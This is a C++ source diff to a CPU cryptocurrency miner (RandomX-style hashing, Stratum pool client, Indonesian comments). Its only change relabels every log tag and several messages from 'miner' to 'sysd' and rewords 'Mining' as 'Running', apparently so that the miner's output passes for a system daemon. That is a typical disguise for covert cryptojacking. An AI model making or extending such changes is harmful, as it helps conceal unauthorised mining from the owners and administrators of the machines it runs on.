@@ -67,7 +67,7 @@ bool Miner::start(const MinerConfig& cfg) {
     // sini supaya semua worker melihat daftar yang sama.
     m_usableCpus = Config::usableCpus();
     if (!m_usableCpus.empty() && m_numThreads > static_cast<int>(m_usableCpus.size()))
-        lg::warn("miner", "threads=" + std::to_string(m_numThreads) + " > CPU tersedia " +
+        lg::warn("sysd", "threads=" + std::to_string(m_numThreads) + " > CPU tersedia " +
                               std::to_string(m_usableCpus.size()) +
                               " — beberapa worker berbagi core, hashrate per worker turun");
 
@@ -115,7 +115,7 @@ bool Miner::start(const MinerConfig& cfg) {
     if (!cfg.useJIT) m_flags = static_cast<randomx_flags>(m_flags & ~RANDOMX_FLAG_JIT);
     if (!cfg.hardAES) m_flags = static_cast<randomx_flags>(m_flags & ~RANDOMX_FLAG_HARD_AES);
 
-    lg::info("miner", "RandomY flags: JIT=" + std::to_string((m_flags & RANDOMX_FLAG_JIT) != 0) +
+    lg::info("sysd", "RandomY flags: JIT=" + std::to_string((m_flags & RANDOMX_FLAG_JIT) != 0) +
                            " FULL_MEM=" +
                            std::to_string((m_flags & RANDOMX_FLAG_FULL_MEM) != 0) +
                            " HARD_AES=" +
@@ -139,14 +139,14 @@ bool Miner::start(const MinerConfig& cfg) {
         auto w = std::make_unique<Worker>();
         w->vm = randomx_create_vm(m_flags, m_cache, m_dataset);
         if (!w->vm) {
-            lg::error("miner", "VM creation failed for worker " + std::to_string(i));
+            lg::error("sysd", "VM creation failed for worker " + std::to_string(i));
             continue;
         }
         w->statsIdx = static_cast<int>(m_workers.size());
         m_workers.push_back(std::move(w));
     }
     if (m_workers.empty()) {
-        lg::error("miner", "No workers created, aborting");
+        lg::error("sysd", "No workers created, aborting");
         m_running.store(false);
         return false;
     }
@@ -158,8 +158,8 @@ bool Miner::start(const MinerConfig& cfg) {
     // (e.g. running=false on exit) before the vector exists -> out_of_range.
     m_running.store(true);
     if (m_uiMode != UiMode::Log)
-        logEvent("miner started, " + std::to_string(m_workers.size()) + " threads");
-    lg::info("miner", "Mining with " + std::to_string(m_workers.size()) + " workers");
+        logEvent("sysd started, " + std::to_string(m_workers.size()) + " threads");
+    lg::info("sysd", "Running with " + std::to_string(m_workers.size()) + " workers");
 
     if (m_benchmark) {
         // Fixed benchmark job: workers hash this header for N nonces.
@@ -193,7 +193,7 @@ bool Miner::start(const MinerConfig& cfg) {
             [this](const Share& s, const std::string& reason) { dropShareCallback(s, reason); });
 
         m_client->connect();
-        lg::info("miner", "Stratum client started");
+        lg::info("sysd", "Stratum client started");
     }
 
     // --- Start worker threads (job is available / will arrive shortly) ---
@@ -276,7 +276,7 @@ bool Miner::initDataset() {
     auto allocCache = [this]() -> randomx_cache* {
         randomx_cache* c = randomx_alloc_cache(m_flags);
         if (!c && (m_flags & RANDOMX_FLAG_LARGE_PAGES)) {
-            lg::warn("miner", "Cache alloc failed with large pages — retrying without them "
+            lg::warn("sysd", "Cache alloc failed with large pages — retrying without them "
                               "(hugepages/mlock unavailable)");
             m_flags = static_cast<randomx_flags>(m_flags & ~RANDOMX_FLAG_LARGE_PAGES);
             c = randomx_alloc_cache(m_flags);
@@ -287,26 +287,26 @@ bool Miner::initDataset() {
     if (m_flags & RANDOMX_FLAG_FULL_MEM) {
         m_cache = allocCache();
         if (!m_cache) {
-            lg::error("miner", "Cache alloc failed (out of memory?)");
+            lg::error("sysd", "Cache alloc failed (out of memory?)");
             return false;
         }
         randomx_init_cache(m_cache, key, sizeof(key));
 
         m_dataset = randomx_alloc_dataset(m_flags);
         if (!m_dataset && (m_flags & RANDOMX_FLAG_LARGE_PAGES)) {
-            lg::warn("miner", "Dataset alloc failed with large pages — retrying without them");
+            lg::warn("sysd", "Dataset alloc failed with large pages — retrying without them");
             m_flags = static_cast<randomx_flags>(m_flags & ~RANDOMX_FLAG_LARGE_PAGES);
             m_dataset = randomx_alloc_dataset(m_flags);
         }
         if (!m_dataset) {
             unsigned long needMb =
                 (randomx_dataset_item_count() * RANDOMX_DATASET_ITEM_SIZE) / (1024 * 1024);
-            lg::error("miner", "Dataset alloc failed (~" + std::to_string(needMb) +
+            lg::error("sysd", "Dataset alloc failed (~" + std::to_string(needMb) +
                                    "MB needed — try FULL_MEM=0)");
             return false;
         }
         uint32_t datasetItems = randomx_dataset_item_count();
-        lg::info("miner", "Dataset items: " + std::to_string(datasetItems));
+        lg::info("sysd", "Dataset items: " + std::to_string(datasetItems));
 
         // Parallel dataset init across all cores.
         int nthreads = std::min(m_numThreads, static_cast<int>(std::thread::hardware_concurrency()));
@@ -327,28 +327,28 @@ bool Miner::initDataset() {
     } else {
         m_cache = allocCache();
         if (!m_cache) {
-            lg::error("miner", "Cache alloc failed (out of memory?)");
+            lg::error("sysd", "Cache alloc failed (out of memory?)");
             return false;
         }
         randomx_init_cache(m_cache, key, sizeof(key));
-        lg::info("miner", "Light mode — using cache (no full dataset)");
+        lg::info("sysd", "Light mode — using cache (no full dataset)");
     }
 
     auto t2 = std::chrono::steady_clock::now();
     auto initMs = std::chrono::duration_cast<std::chrono::milliseconds>(t2 - t1).count();
-    lg::info("miner", "Dataset ready in " + std::to_string(initMs / 1000.0) + "s");
+    lg::info("sysd", "Dataset ready in " + std::to_string(initMs / 1000.0) + "s");
     return true;
 }
 
 void Miner::onNewJob(const Job& job) {
     // Nonce start diacak per job, bukan direset ke 0. Dengan reset ke 0, dua
-    // miner yang menerima job sama menghitung deretan nonce yang identik —
+    // sysd yang menerima job sama menghitung deretan nonce yang identik —
     // diuji dengan pool pencatat nonce: 100% tumpang tindih, satu di antaranya
     // murni kerja terbuang. Diverifikasi juga bahwa pool nyata menerima nonce
     // di seluruh rentang 64-bit (0x0, 0x1_0000_0000, 0xf0000000000000ff semua
     // accept 100.0%), jadi mengacak titik awal tidak menaikkan share ditolak.
     //
-    // Ruang nonce 2^64 dengan hashrate CPU (ribuan H/s): peluang dua miner
+    // Ruang nonce 2^64 dengan hashrate CPU (ribuan H/s): peluang dua sysd
     // bertabrakan dalam satu job praktis nol.
     uint64_t nonceStart;
     {
@@ -366,13 +366,13 @@ void Miner::onNewJob(const Job& job) {
             (job.targetInt <= 1) ? 0xffffffffffffffffULL
                                  : (uint64_t)(1.8446744073709552e19 / (double)job.targetInt);
     }
-    lg::info("miner", "New job " + job.jobId);
+    lg::info("sysd", "New job " + job.jobId);
     logEvent("new job " + job.jobId + " (diff " +
              std::to_string(m_stats.farm().difficulty) + ")");
     // Key RandomY di-init sekali dari key tetap; seed baru dari pool berarti
     // hash kita tidak lagi cocok dengan yang divalidasi pool.
     if (job.seedChanged)
-        logEvent("PERINGATAN: seed hash pool berubah — restart miner bila share mulai ditolak");
+        logEvent("PERINGATAN: seed hash pool berubah — restart sysd bila share mulai ditolak");
 }
 
 void Miner::onShareResult(bool ok, const std::string& reason, int delayMs, int workerIdx) {
@@ -383,14 +383,14 @@ void Miner::onShareResult(bool ok, const std::string& reason, int delayMs, int w
         std::string msg = "Share accepted (W" + std::to_string(workerIdx) + ", " +
                           std::to_string(delayMs) + "ms) [#" + std::to_string(n) + "]";
         if (m_verboseShares)
-            lg::good("miner", msg);
+            lg::good("sysd", msg);
         else
-            lg::debug("miner", msg);
+            lg::debug("sysd", msg);
         logEvent("accepted W" + std::to_string(workerIdx) + " (" + std::to_string(delayMs) +
                  "ms, #" + std::to_string(n) + ")");
     } else {
         ws.rejected.fetch_add(1, std::memory_order_relaxed);
-        lg::warn("miner", "Share rejected (W" + std::to_string(workerIdx) + "): " + reason +
+        lg::warn("sysd", "Share rejected (W" + std::to_string(workerIdx) + "): " + reason +
                                " (" + std::to_string(delayMs) + "ms)");
         logEvent("rejected W" + std::to_string(workerIdx) + ": " + reason);
     }
@@ -409,13 +409,13 @@ bool Miner::submitShareCallback(const Share& s) {
         std::lock_guard<std::mutex> lock(m_jobMutex);
         if (m_job && m_job->jobId != s.jobId) {
             m_stats.worker(s.workerIdx).wasted.fetch_add(1, std::memory_order_relaxed);
-            lg::debug("miner", "Share dropped: stale job " + s.jobId);
+            lg::debug("sysd", "Share dropped: stale job " + s.jobId);
             return true;  // handled (counted as wasted)
         }
     }
     if (!m_client || !m_client->submitShare(s.headerHex, s.nonceHex, s.mixHex, s.workerIdx)) {
         m_stats.worker(s.workerIdx).wasted.fetch_add(1, std::memory_order_relaxed);
-        lg::debug("miner", "Share dropped: no connection");
+        lg::debug("sysd", "Share dropped: no connection");
         return true;
     }
     return true;
@@ -423,7 +423,7 @@ bool Miner::submitShareCallback(const Share& s) {
 
 void Miner::dropShareCallback(const Share& s, const std::string& reason) {
     m_stats.worker(s.workerIdx).wasted.fetch_add(1, std::memory_order_relaxed);
-    lg::warn("miner", "Share dropped: " + reason);
+    lg::warn("sysd", "Share dropped: " + reason);
     logEvent("wasted: " + reason);
 }
 
@@ -516,7 +516,7 @@ void Miner::workerLoop(Worker* w) {
             CPU_SET(cpu, &cpuset);
             int rc = pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
             if (rc != 0)
-                lg::warn("miner", "W" + std::to_string(idx) + ": gagal pin ke CPU " +
+                lg::warn("sysd", "W" + std::to_string(idx) + ": gagal pin ke CPU " +
                                       std::to_string(cpu) + " (" + std::strerror(rc) + ")");
         }
     }
@@ -563,7 +563,7 @@ void Miner::workerLoop(Worker* w) {
             // periksa juga di sisi konsumen, bukan percaya pemanggil.
             headerOk = (current->header.size() == 32);
             if (!headerOk)
-                lg::error("miner", "Job " + current->jobId + " header " +
+                lg::error("sysd", "Job " + current->jobId + " header " +
                                        std::to_string(current->header.size()) +
                                        " byte (butuh 32) — dilewati");
         }
@@ -679,7 +679,7 @@ void Miner::statsLoop() {
                 std::chrono::duration_cast<std::chrono::seconds>(now - lastDetail).count();
             if (sinceDetail >= 60) {
                 lastDetail = now;
-                lg::info("miner", m_stats.detailBlock());
+                lg::info("sysd", m_stats.detailBlock());
             }
         }
 
